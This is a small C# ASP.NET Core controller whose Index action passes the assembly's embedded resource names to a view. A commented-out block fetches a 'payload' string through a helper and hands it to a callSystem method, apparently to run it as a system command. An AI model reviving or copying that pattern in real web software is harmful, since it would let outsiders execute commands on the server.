using System;
using System.Reflection;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using namba.Models;
using namba.Interfaces;

namespace namba.Controllers
{

	public class LambaController : Controller
	{
		private readonly IHelper _helper;
		
		public LambaController(IHelper helper)
		{
			_helper = helper;
		}
		
		// GET: lamba
		public ActionResult Index()
		{
		    /*
			Console.WriteLine(Request.GetDisplayUrl());
		    Console.WriteLine(Request.GetEncodedUrl());
			
			string ret = _helper.getPayload();
			int ret2 = 0;
			
			if(ret.Length > 0)
			{
				ret2 = _helper.callSystem(ret);
			}
			*/
			
			//var uaParser = Parser.GetDefault();
			string[] resourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
			ViewData["resourceNames"] = resourceNames;
			//var agt = Request.UserAgent;
             
			return View();
		}
	}
}